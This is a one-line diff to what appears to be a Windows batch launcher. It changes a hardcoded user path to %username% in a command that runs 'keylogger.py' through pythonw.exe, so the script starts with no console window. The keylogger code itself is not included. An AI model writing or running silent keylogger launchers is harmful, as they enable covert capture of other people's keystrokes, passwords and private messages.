@@ -1,1 +1,1 @@
-start "C:\Users\duhch\Desktop\Programming\Python\" pythonw.exe keylogger.py & exit()
+start "C:\Users\%username%\Desktop\Programming\Python\" pythonw.exe keylogger.py & exit()
